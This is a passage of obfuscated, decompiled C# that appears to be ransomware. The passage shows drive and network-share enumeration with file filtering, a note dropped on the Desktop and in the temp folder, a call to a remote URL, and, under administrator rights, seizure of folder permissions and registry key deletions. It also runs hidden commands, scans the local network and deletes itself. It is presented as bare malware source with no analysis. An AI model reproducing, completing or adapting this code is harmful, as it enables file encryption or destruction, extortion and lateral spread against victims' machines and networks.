					streamWriter3.WriteLine(OXVbUzKTVitWIr + wcGmwtolXpKf(getString_0(107389288)));
					if (PEOsufOVorqNP == getString_0(107397110))
					{
						streamWriter3.WriteLine(getString_0(107396324));
						streamWriter3.WriteLine(wcGmwtolXpKf(getString_0(107389243)) + wcGmwtolXpKf(getString_0(107393980)) + Convert.ToString(ngVLNnblfHHw.Count) + wcGmwtolXpKf(getString_0(107389288)));
					}
					if (vzooNONBAAoJ)
					{
						streamWriter3.WriteLine(getString_0(107396324));
						streamWriter3.WriteLine(wcGmwtolXpKf(getString_0(107393935)));
						streamWriter3.WriteLine(ZAUYlWQzUcjJsT.FkWAcFxnCvQ());
					}
				}
				else
				{
					string text13 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395992));
					if (!text13.Contains(OXVbUzKTVitWIr) && !AcumuDDlRST)
					{
						File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107393580), wcGmwtolXpKf(getString_0(107389243)) + getString_0(107393390) + OXVbUzKTVitWIr + wcGmwtolXpKf(getString_0(107389288)));
					}
				}
			}
			catch
			{
			}
		}
		if (MvoNMddyflMC == getString_0(107396853))
		{
			try
			{
				if (PEOsufOVorqNP == getString_0(107397110))
				{
					ZAUYlWQzUcjJsT.ApImgxySQHLIj(getString_0(107389182), getString_0(107389177), getString_0(107389196), string.Concat(wcGmwtolXpKf(getString_0(107396390)), new WebClient().DownloadString(wcGmwtolXpKf(getString_0(107396365))), getString_0(107389187), wcGmwtolXpKf(getString_0(107396287)), DateTime.Now, getString_0(107396324), wcGmwtolXpKf(getString_0(107389150)), Convert.ToString(ngVLNnblfHHw.Count), getString_0(107396324), wcGmwtolXpKf(getString_0(107396246)), OXVbUzKTVitWIr));
				}
				else
				{
					ZAUYlWQzUcjJsT.ApImgxySQHLIj(getString_0(107389182), getString_0(107389177), getString_0(107389196), string.Concat(wcGmwtolXpKf(getString_0(107396390)), new WebClient().DownloadString(wcGmwtolXpKf(getString_0(107396365))), getString_0(107389187), wcGmwtolXpKf(getString_0(107396287)), DateTime.Now, getString_0(107396324), wcGmwtolXpKf(getString_0(107389150)), Convert.ToString(ngVLNnblfHHw.Count), getString_0(107396324), wcGmwtolXpKf(getString_0(107396246)), OXVbUzKTVitWIr));
				}
			}
			catch
			{
			}
		}
		if (KHZEvaaAjnAHLm == getString_0(107396853))
		{
			try
			{
				xeFbQvXudCHHbKhBm.JacoaVZyhktu(new Uri(getString_0(107389133)));
			}
			catch
			{
			}
		}
		if (atVhanzdqXfhb == getString_0(107397110))
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395992)))
				{
					Process.Start(wcGmwtolXpKf(getString_0(107389132)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395992));
				}
			}
			catch
			{
			}
		}
		else
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107393580)))
				{
					Process.Start(wcGmwtolXpKf(getString_0(107389075)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107393580));
				}
			}
			catch
			{
			}
		}
		if (!string.IsNullOrEmpty(HKveNHqmcCcd))
		{
			try
			{
				File.Delete(HKveNHqmcCcd);
			}
			catch
			{
			}
		}
		try
		{
			if (File.Exists(Path.Combine(Directory.GetCurrentDirectory(), getString_0(107396738))))
			{
				File.Delete(Path.Combine(Directory.GetCurrentDirectory(), getString_0(107396738)));
			}
		}
		catch (Exception ex15)
		{
			try
			{
				File.AppendAllText(MGkBzYPheHDPb, getString_0(107389058) + ex15.Message);
			}
			catch (Exception)
			{
			}
		}
		if (VLajbDNhoSbf)
		{
			try
			{
				File.AppendAllText(MGkBzYPheHDPb, getString_0(107389525));
			}
			catch (Exception)
			{
			}
		}
		if (wUDkdnCGLMOs == getString_0(107389544))
		{
			xcaeYZPGZgKKc();
		}
	}

	public static void RQUiqIqcSpMSh()
	{
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show(wcGmwtolXpKf(getString_0(107389503)), wcGmwtolXpKf(getString_0(107389381)), (MessageBoxButtons)0, (MessageBoxIcon)16);
	}

	private static int ReFMgGBdkgXDPi(int int_0, int int_1)
	{
		RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		byte[] array = new byte[4];
		rNGCryptoServiceProvider.GetBytes(array);
		int seed = BitConverter.ToInt32(array, 0);
		return new Random(seed).Next(int_0, int_1);
	}

	public static List<string> hJGVYqVOZlMWq(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		Stack<string> stack = new Stack<string>(20);
		stack.Push(string_0);
		while (stack.Count > 0)
		{
			string text = stack.Pop();
			string[] directories;
			try
			{
				directories = Directory.GetDirectories(text);
			}
			catch
			{
				continue;
			}
			string[] array = null;
			try
			{
				if (!text.Contains(getString_0(107389352)) && !text.Contains(getString_0(107389327)) && !text.Contains(getString_0(107388782)) && !text.ToLower().Contains(getString_0(107388733)) && !text.ToLower().Contains(getString_0(107388752)) && !text.Contains(getString_0(107388695)) && !text.Contains(getString_0(107388674)) && !text.ToLower().Contains(getString_0(107388661)) && !text.ToLower().Contains(getString_0(107388680)) && !text.ToLower().Contains(getString_0(107388643)) && !text.ToLower().Contains(getString_0(107388602)) && !text.ToLower().Contains(getString_0(107388617)) && !text.ToLower().Contains(getString_0(107388572)) && !text.ToLower().Contains(getString_0(107388591)) && !text.ToLower().Contains(getString_0(107388538)))
				{
					array = Directory.GetFiles(text);
					goto IL_01f1;
				}
			}
			catch
			{
			}
			continue;
			IL_01f1:
			string[] array2 = array;
			foreach (string fileName in array2)
			{
				try
				{
					FileInfo fileInfo = new FileInfo(fileName);
					if (!fileInfo.FullName.Contains(getString_0(107389025)) && !fileInfo.FullName.Contains(getString_0(107389040)) && !fileInfo.FullName.Contains(getString_0(107388991)) && !fileInfo.FullName.Contains(getString_0(107389006)) && !fileInfo.FullName.Contains(getString_0(107388957)) && !fileInfo.FullName.Contains(getString_0(107388972)) && !fileInfo.FullName.Contains(getString_0(107388923)) && !fileInfo.FullName.Contains(getString_0(107388938)) && !fileInfo.FullName.Contains(getString_0(107388893)) && !fileInfo.FullName.Contains(getString_0(107388904)) && !fileInfo.FullName.ToLower().Contains(getString_0(107388859)) && !fileInfo.FullName.ToLower().Contains(getString_0(107388878)) && !fileInfo.FullName.ToLower().Contains(getString_0(107388829)) && !fileInfo.FullName.ToLower().Contains(getString_0(107388844)) && !fileInfo.FullName.Contains(wcGmwtolXpKf(getString_0(107388795))) && !fileInfo.FullName.Contains(getString_0(107388258)) && !fileInfo.FullName.Contains(getString_0(107396738)) && !fileInfo.FullName.Contains(getString_0(107388245)) && !fileInfo.FullName.EndsWith(getString_0(107396041)) && !fileInfo.FullName.EndsWith(getString_0(107388220)) && !fileInfo.FullName.EndsWith(getString_0(107388215)) && !fileInfo.FullName.EndsWith(getString_0(107388242)) && !fileInfo.FullName.EndsWith(getString_0(107388237)) && !fileInfo.FullName.Contains(getString_0(107388232)) && !fileInfo.FullName.Contains(NnEdFRIdEjUNKn) && !fileInfo.FullName.Contains(MGkBzYPheHDPb) && !fileInfo.FullName.Contains(iMvajZNuOYl))
					{
						if (File.Exists(fileInfo.FullName) && (double)fileInfo.Length <= double.Parse(xtbYgrRCEXRhIt) * 1024.0 * 1024.0 && VIsIdhZRykLqTUQDB == getString_0(107396853))
						{
							list.Add(fileInfo.FullName);
							okFHpRwDWrzGV(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
						else if (File.Exists(fileInfo.FullName) && VIsIdhZRykLqTUQDB == getString_0(107397110))
						{
							list.Add(fileInfo.FullName);
							okFHpRwDWrzGV(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
					}
				}
				catch
				{
				}
			}
			string[] array3 = directories;
			foreach (string item in array3)
			{
				stack.Push(item);
			}
		}
		return list;
	}

	public static void uqnjKildcmP()
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0015: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0033: Expected O, but got Unknown
		ManagementObjectSearcher val = new ManagementObjectSearcher(getString_0(107388183));
		ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				if (!jwBOsivrxmQ.Contains(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107388130), getString_0(107396775)).Replace(getString_0(107388125), getString_0(107388130))
					.Replace(getString_0(107388116), getString_0(107389133))
					.Split(new char[1] { '(' })[0].Trim()))
				{
					jwBOsivrxmQ.Add(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107388130), getString_0(107396775)).Replace(getString_0(107388125), getString_0(107388130))
						.Replace(getString_0(107388116), getString_0(107389133))
						.Split(new char[1] { '(' })[0].Trim().Replace(getString_0(107388143), getString_0(107389133)));
				}
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
	}

	public static string ZMMcdzUOldsoj(string TxfcwcTQiUmz = "", string bGVppORDwWhcn = "")
	{
		string result = getString_0(107389133);
		try
		{
			Process process = new Process();
			process.StartInfo = new ProcessStartInfo
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = TxfcwcTQiUmz,
				Arguments = bGVppORDwWhcn,
				UseShellExecute = false,
				RedirectStandardOutput = true,
				StandardOutputEncoding = Encoding.GetEncoding(850)
			};
			Process process2 = process;
			process2.Start();
			result = process2.StandardOutput.ReadToEnd();
			process2.WaitForExit(2500);
			process2.Kill();
			return result;
		}
		catch
		{
			return result;
		}
	}

	public static void AEUbRIwmYeKcua(string string_0)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = getString_0(107388134),
			Arguments = string_0,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
	}

	public static string AeqRpGGGnSrlvi(string string_0)
	{
		char[] array = string_0.ToCharArray();
		Array.Reverse((Array)array);
		return new string(array);
	}

	public static string wcGmwtolXpKf(string string_0)
	{
		byte[] bytes = Convert.FromBase64String(string_0);
		return Encoding.UTF8.GetString(bytes);
	}

	private static void IFXniAHbpQhNBUaFd()
	{
		//IL_0257: Unknown result type (might be due to invalid IL or missing references)
		//IL_025e: Expected O, but got Unknown
		//IL_0280: Unknown result type (might be due to invalid IL or missing references)
		//IL_0287: Expected O, but got Unknown
		YHeePdCWCXKv();
		List<NPGiFhnMWu> list = NPGiFhnMWu.aPXDXVzlrqIB();
		foreach (NPGiFhnMWu item in list)
		{
			IJrbxyWohjq.Add(item.IPAddress);
		}
		List<string> iJrbxyWohjq = IJrbxyWohjq;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate19 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate19 = delegate(string string_0)
			{
				nIgmNIXelPinh CS_0024_003C_003E8__locals0 = new nIgmNIXelPinh();
				CS_0024_003C_003E8__locals0.LpqzqekLavlGf = string_0;
				if ((!CS_0024_003C_003E8__locals0.LpqzqekLavlGf.StartsWith(getString_0(107386252)) && !CS_0024_003C_003E8__locals0.LpqzqekLavlGf.StartsWith(getString_0(107386247)) && !CS_0024_003C_003E8__locals0.LpqzqekLavlGf.StartsWith(getString_0(107385694)) && !CS_0024_003C_003E8__locals0.LpqzqekLavlGf.StartsWith(getString_0(107389133))) || !YvpiSoEdxRAzW.VuaFZudDlmje(CS_0024_003C_003E8__locals0.LpqzqekLavlGf))
				{
					return;
				}
				try
				{
					Thread.Sleep(rqDMxhDDSWkTsJ);
					jwBOsivrxmQ.Add(getString_0(107388130) + CS_0024_003C_003E8__locals0.LpqzqekLavlGf + getString_0(107385713));
					try
					{
						if (RiGciHwEXLcD)
						{
							Console.WriteLine(getString_0(107388130) + CS_0024_003C_003E8__locals0.LpqzqekLavlGf + getString_0(107385713));
						}
					}
					catch
					{
					}
					Parallel.For(68, 91, delegate(int int_0)
					{
						Thread.Sleep(rqDMxhDDSWkTsJ);
						jwBOsivrxmQ.Add(nIgmNIXelPinh.getString_0(107388136) + CS_0024_003C_003E8__locals0.LpqzqekLavlGf + nIgmNIXelPinh.getString_0(107396781) + (char)int_0 + nIgmNIXelPinh.getString_0(107403681));
						try
						{
							if (RiGciHwEXLcD)
							{
								Console.WriteLine(nIgmNIXelPinh.getString_0(107388136) + CS_0024_003C_003E8__locals0.LpqzqekLavlGf + nIgmNIXelPinh.getString_0(107396781) + (char)int_0 + nIgmNIXelPinh.getString_0(107403681));
							}
						}
						catch
						{
						}
					});
				}
				catch
				{
				}
			};
		}
		Parallel.ForEach(iJrbxyWohjq, CS_0024_003C_003E9__CachedAnonymousMethodDelegate19);
		try
		{
			YvpiSoEdxRAzW.qlpDvnfSGETmQi qlpDvnfSGETmQi = new YvpiSoEdxRAzW.qlpDvnfSGETmQi(YvpiSoEdxRAzW.GWVFcRvPYepkqJ.fmkDObkOOkbJz, YvpiSoEdxRAzW.scceMdtMwtPojMP.vkGbLuPVid, YvpiSoEdxRAzW.aRdWKWCkZOtQbD.qPHNcpCyJORQ, YvpiSoEdxRAzW.EVMBSMlVoLD.JIzGRbfVzvv);
			foreach (string item2 in qlpDvnfSGETmQi)
			{
				MatchCollection matchCollection = Regex.Matches(item2, getString_0(107388085));
				foreach (Match item3 in matchCollection)
				{
					try
					{
						if (!jwBOsivrxmQ.Contains(item3.ToString()))
						{
							jwBOsivrxmQ.Add(item3.ToString());
						}
					}
					catch
					{
					}
					try
					{
						if (RiGciHwEXLcD)
						{
							Console.WriteLine(item3.ToString());
						}
					}
					catch
					{
					}
				}
			}
		}
		catch (Exception)
		{
		}
		GtnXAQsBIqq.GDqNUKzgVSJjD();
		try
		{
			if (RiGciHwEXLcD)
			{
				Console.WriteLine(getString_0(107388036));
			}
		}
		catch
		{
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			try
			{
				string string_ = AeqRpGGGnSrlvi(getString_0(107388475));
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(wcGmwtolXpKf(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.SetValue(wcGmwtolXpKf(getString_0(107388402)), 1, RegistryValueKind.DWord);
					registryKey.SetValue(wcGmwtolXpKf(getString_0(107388313)), 1, RegistryValueKind.DWord);
					registryKey.Close();
				}
			}
			catch
			{
			}
		}
		if (JckzaJkTNZBlbcc == getString_0(107396853))
		{
			SrTwmJlhYIVy.naLQkWiYOZ();
		}
		try
		{
			if (RiGciHwEXLcD)
			{
				Console.WriteLine(getString_0(107388300));
			}
		}
		catch
		{
		}
		ManagementObjectSearcher val = new ManagementObjectSearcher(getString_0(107388183));
		ManagementObjectEnumerator enumerator4 = val.Get().GetEnumerator();
		try
		{
			while (enumerator4.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator4.get_Current();
				if (jwBOsivrxmQ.Contains(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107388130), getString_0(107396775)).Replace(getString_0(107388125), getString_0(107388130))
					.Replace(getString_0(107388116), getString_0(107389133))
					.Split(new char[1] { '(' })[0].Trim()))
				{
					continue;
				}
				try
				{
					if (RiGciHwEXLcD)
					{
						Console.WriteLine(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107388130), getString_0(107396775)).Replace(getString_0(107388125), getString_0(107388130))
							.Replace(getString_0(107388116), getString_0(107389133))
							.Split(new char[1] { '(' })[0].Trim().Replace(getString_0(107388143), getString_0(107389133)));
					}
				}
				catch
				{
				}
				jwBOsivrxmQ.Add(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107388130), getString_0(107396775)).Replace(getString_0(107388125), getString_0(107388130))
					.Replace(getString_0(107388116), getString_0(107389133))
					.Split(new char[1] { '(' })[0].Trim().Replace(getString_0(107388143), getString_0(107389133)));
			}
		}
		finally
		{
			((IDisposable)enumerator4)?.Dispose();
		}
		try
		{
			if (RiGciHwEXLcD)
			{
				Console.WriteLine(getString_0(107387699));
			}
		}
		catch
		{
		}
	}

	public static void MquKelznTSTt(string string_0)
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = wcGmwtolXpKf(getString_0(107387662));
		processStartInfo.Arguments = getString_0(107387633) + string_0;
		processStartInfo.RedirectStandardError = true;
		processStartInfo.RedirectStandardOutput = true;
		processStartInfo.UseShellExecute = false;
		processStartInfo.CreateNoWindow = true;
		Process process = new Process();
		process.StartInfo = processStartInfo;
		process.Start();
	}

	private static bool rXfHCYqjpT(string string_0, string string_1)
	{
		try
		{
			FileSystemAccessRule rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.None, PropagationFlags.NoPropagateInherit, AccessControlType.Allow);
			DirectoryInfo directoryInfo = new DirectoryInfo(string_1);
			DirectorySecurity accessControl = directoryInfo.GetAccessControl(AccessControlSections.Access);
			accessControl.ModifyAccessRule(AccessControlModification.Set, rule, out var modified);
			if (!modified)
			{
				return false;
			}
			rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.InheritOnly, AccessControlType.Allow);
			accessControl.ModifyAccessRule(AccessControlModification.Add, rule, out modified);
			if (!modified)
			{
				return false;
			}
			directoryInfo.SetAccessControl(accessControl);
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static void bYoeNeBSpqUE()
	{
		try
		{
			if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				return;
			}
			string string_ = AeqRpGGGnSrlvi(getString_0(107387628));
			try
			{
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(wcGmwtolXpKf(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(wcGmwtolXpKf(getString_0(107387970)));
					registryKey.DeleteSubKey(wcGmwtolXpKf(getString_0(107387977)));
					registryKey.DeleteSubKey(wcGmwtolXpKf(getString_0(107387928)));
					registryKey.DeleteSubKey(wcGmwtolXpKf(getString_0(107387903)));
					registryKey.DeleteSubKey(wcGmwtolXpKf(getString_0(107387662)));
					registryKey.DeleteSubKey(wcGmwtolXpKf(getString_0(107387910)));
					registryKey.DeleteSubKey(wcGmwtolXpKf(getString_0(107387881)));
					registryKey.Close();
				}
				string_ = AeqRpGGGnSrlvi(getString_0(107387832));
				registryKey = Registry.LocalMachine.OpenSubKey(wcGmwtolXpKf(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(wcGmwtolXpKf(getString_0(107387223)));
					registryKey.Close();
				}
				string_ = AeqRpGGGnSrlvi(getString_0(107387238));
				registryKey = Registry.LocalMachine.OpenSubKey(wcGmwtolXpKf(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(wcGmwtolXpKf(getString_0(107387223)));
					registryKey.Close();
				}
				string_ = AeqRpGGGnSrlvi(getString_0(107387238));
				registryKey = Registry.CurrentUser.OpenSubKey(wcGmwtolXpKf(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(wcGmwtolXpKf(getString_0(107387223)));
					registryKey.Close();
				}
			}
			catch
			{
			}
			ZMMcdzUOldsoj(wcGmwtolXpKf(getString_0(107387189)), wcGmwtolXpKf(getString_0(107387204)));
			ZMMcdzUOldsoj(wcGmwtolXpKf(getString_0(107387123)), wcGmwtolXpKf(AeqRpGGGnSrlvi(getString_0(107387146))));
			ZMMcdzUOldsoj(wcGmwtolXpKf(getString_0(107387123)), wcGmwtolXpKf(getString_0(107387480)));
			ZMMcdzUOldsoj(wcGmwtolXpKf(getString_0(107387419)), wcGmwtolXpKf(getString_0(107387434)));
		}
		catch
		{
		}
	}

	public static void hOfBAzalVlDAWcj(string string_0, byte[] byte_0)
	{
		try
		{
			byte[] bytes = Encoding.ASCII.GetBytes(wcGmwtolXpKf(getString_0(107387329)));
			using FileStream fileStream = new FileStream(string_0, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			fileStream.Write(byte_0, 0, byte_0.Length);
			fileStream.Write(bytes, 0, bytes.Length);
		}
		catch (Exception)
		{
		}
	}

	public static void LPAdufvaeyUjKQN()
	{
		string string_ = AeqRpGGGnSrlvi(getString_0(107387336));
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(wcGmwtolXpKf(string_), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(wcGmwtolXpKf(getString_0(107386711)), 1, RegistryValueKind.DWord);
				registryKey.Close();
			}
		}
		catch
		{
		}
	}

	public static void YHeePdCWCXKv()
	{
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			ZMMcdzUOldsoj(wcGmwtolXpKf(getString_0(107386678)), wcGmwtolXpKf(getString_0(107386697)));
			ZMMcdzUOldsoj(wcGmwtolXpKf(getString_0(107386678)), wcGmwtolXpKf(getString_0(107386567)));
		}
	}

	[DllImport("mpr.dll")]
	private static extern int WNetGetUniversalNameA(string string_0, int int_0, IntPtr intptr_0, ref int int_1);

	private static string xWKbJCPQtbMhm(string cuaFXRhTXg, int AheIAaBordQEK = 2000)
	{
		IntPtr intPtr;
		try
		{
			intPtr = Marshal.AllocHGlobal(AheIAaBordQEK);
		}
		catch (OutOfMemoryException)
		{
			return null;
		}
		try
		{
			if (WNetGetUniversalNameA(cuaFXRhTXg, 1, intPtr, ref AheIAaBordQEK) != 0)
			{
				return null;
			}
			return Marshal.PtrToStringAnsi(Marshal.ReadIntPtr(intPtr));
		}
		catch (Exception)
		{
			return null;
		}
		finally
		{
			Marshal.FreeHGlobal(intPtr);
		}
	}

	public static void xcaeYZPGZgKKc()
	{
		ZMMcdzUOldsoj(getString_0(107397033), wcGmwtolXpKf(getString_0(107386901)));
		string text = wcGmwtolXpKf(getString_0(107386195));
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.Arguments = getString_0(107388116) + text + getString_0(107388116) + Assembly.GetEntryAssembly()!.Location;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.FileName = getString_0(107397033);
		Process.Start(processStartInfo);
		Environment.Exit(0);
	}

	public static void MpaCfTRkZWHvoHNT(string string_0)
	{
		try
		{
			FileAttributes attributes = File.GetAttributes(string_0);
			if ((attributes & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
			{
				File.SetAttributes(string_0, attributes & ~FileAttributes.ReadOnly);
			}
			attributes = File.GetAttributes(string_0);
			if ((attributes & FileAttributes.Hidden) == FileAttributes.Hidden)
			{
				File.SetAttributes(string_0, attributes & ~FileAttributes.Hidden);
			}
		}
		catch (Exception ex)
		{
			if (VLajbDNhoSbf)
			{
				try
				{
					File.AppendAllText(MGkBzYPheHDPb, getString_0(107386162) + string_0 + getString_0(107386153) + ex.Message + getString_0(107396324));
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	public static string fSJKiQHscLg()
	{
		OperatingSystem oSVersion = Environment.OSVersion;
		Version version = oSVersion.Version;
		string text = getString_0(107389133);
		if (oSVersion.Platform == PlatformID.Win32Windows)
		{
			switch (version.Minor)
			{
			case 90:
				text = getString_0(107386064);
				break;
			case 10:
				text = ((!(version.Revision.ToString() == getString_0(107386087))) ? getString_0(107386037) : getString_0(107386046));
				break;
			case 0:
				text = getString_0(107386092);
				break;
			}
		}
		else if (oSVersion.Platform == PlatformID.Win32NT)
		{
			switch (version.Major)
			{
			case 3:
				text = getString_0(107386059);
				break;
			case 4:
				text = getString_0(107386014);
				break;
			case 5:
				text = ((version.Minor != 0) ? getString_0(107386028) : getString_0(107386005));
				break;
			case 6:
				text = ((version.Minor != 0) ? ((version.Minor != 1) ? ((version.Minor != 2) ? getString_0(107385972) : getString_0(107385977)) : getString_0(107385982)) : getString_0(107386023));
				break;
			case 10:
				text = getString_0(107385999);
				break;
			}
		}
		if (text != getString_0(107389133))
		{
			text = getString_0(107385994) + text;
			if (oSVersion.ServicePack != getString_0(107389133))
			{
				text = text + getString_0(107386461) + oSVersion.ServicePack;
			}
		}
		return text;
	}

	public static string VAHCeUsPiFi(string string_0)
	{
		string text = Path.GetTempPath() + getString_0(107395992);
		try
		{
			if (!File.Exists(text))
			{
				using StreamWriter streamWriter = new StreamWriter(text);
				streamWriter.WriteLine(wcGmwtolXpKf(getString_0(107395959)));
				streamWriter.WriteLine(getString_0(107396324));
				streamWriter.WriteLine(wcGmwtolXpKf(getString_0(107394013)));
				streamWriter.WriteLine(string_0);
				if (vzooNONBAAoJ)
				{
					streamWriter.WriteLine(getString_0(107396324));
					streamWriter.WriteLine(wcGmwtolXpKf(getString_0(107393935)));
					streamWriter.WriteLine(ZAUYlWQzUcjJsT.FkWAcFxnCvQ());
				}
			}
			else
			{
				string text2 = File.ReadAllText(text);
				if (!text2.Contains(string_0) && !AcumuDDlRST)
				{
					File.AppendAllText(text, getString_0(107393390) + string_0);
				}
			}
			return text;
		}
		catch (Exception ex)
		{
			if (VLajbDNhoSbf)
			{
				try
				{
					File.AppendAllText(MGkBzYPheHDPb, getString_0(107386456) + ex.Message + getString_0(107396324));
					return text;
				}
				catch (Exception)
				{
					return text;
				}
			}
			return text;
		}
	}

	private static void biNZUHxwhHJ(string[] string_0, string[] string_1, string[] string_2, string string_3, string string_4)
	{
		vOHOsvLviLQqmJ.ZJQRQbsKlksRfB CS_0024_003C_003E8__locals0 = new vOHOsvLviLQqmJ();
		CS_0024_003C_003E8__locals0.kBxPEhJgsWQ = string_1;
		CS_0024_003C_003E8__locals0.FNoMAhwXyXFqhpl = string_2;
		CS_0024_003C_003E8__locals0.NcdJFcIQTBnl = string_3;
		CS_0024_003C_003E8__locals0.HFAvvYnqToNmgO = string_4;
		if (YAyTMwdzmcgjIt && !fSJKiQHscLg().Contains(getString_0(107386028)))
		{
			jErzoSNhPwW.ppWbjtgIxNyP();
		}
		oybyixAEyQBUaM = Convert.FromBase64String(CS_0024_003C_003E8__locals0.NcdJFcIQTBnl);
		DriveInfo[] array = null;
		if (string_0[0] == getString_0(107386399))
		{
			try
			{
				array = DriveInfo.GetDrives();
			}
			catch (Exception)
			{
			}
			if (array.Length > 0)
			{
				for (int i = 0; i < array.Length; i++)
				{
					if (!array[i].IsReady || array[i].DriveType == DriveType.CDRom)
					{
						continue;
					}
					if (array[i].DriveType == DriveType.Network)
					{
						try
						{
							string text = xWKbJCPQtbMhm(array[i].Name);
							if (!string.IsNullOrEmpty(text) && !jwBOsivrxmQ.Contains(text))
							{
								jwBOsivrxmQ.Add(text);
							}
							else if (!jwBOsivrxmQ.Contains(array[i].Name))
							{
								jwBOsivrxmQ.Add(array[i].Name);
							}
						}
						catch (Exception)
						{
							if (!jwBOsivrxmQ.Contains(array[i].Name))
							{
								jwBOsivrxmQ.Add(array[i].Name);
							}
						}
					}
					else if (!jwBOsivrxmQ.Contains(array[i].Name))
					{
						jwBOsivrxmQ.Add(array[i].Name);
					}
				}
			}
		}
		else
		{
			for (int j = 0; j < string_0.Length; j++)
			{
				if (!jwBOsivrxmQ.Contains(string_0[j]))
				{
					jwBOsivrxmQ.Add(string_0[j]);
				}
			}
		}
		if (jwBOsivrxmQ.Contains(wcGmwtolXpKf(getString_0(107386390))) && XmxvSLbGDWQx == getString_0(107396853))
		{
			jwBOsivrxmQ.Remove(wcGmwtolXpKf(getString_0(107386390)));
		}
		Parallel.ForEach(jwBOsivrxmQ, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new vOHOsvLviLQqmJ.ZJQRQbsKlksRfB();
			CS_0024_003C_003E8__locals0.BNdekvQMINxw = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.sQzjrqksarliXmnhP = string_0;
			if (kwebbXGLWFTcp && !fSJKiQHscLg().Contains(vOHOsvLviLQqmJ.getString_0(107386039)) && !fSJKiQHscLg().Contains(vOHOsvLviLQqmJ.getString_0(107403681)))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						rXfHCYqjpT(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.sQzjrqksarliXmnhP);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (PEOsufOVorqNP == vOHOsvLviLQqmJ.getString_0(107396864))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					OsuwEthgRZZacQeE(CS_0024_003C_003E8__locals0.sQzjrqksarliXmnhP, CS_0024_003C_003E8__locals0.BNdekvQMINxw.kBxPEhJgsWQ, CS_0024_003C_003E8__locals0.BNdekvQMINxw.HFAvvYnqToNmgO, CS_0024_003C_003E8__locals0.BNdekvQMINxw.FNoMAhwXyXFqhpl, CS_0024_003C_003E8__locals0.BNdekvQMINxw.NcdJFcIQTBnl);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
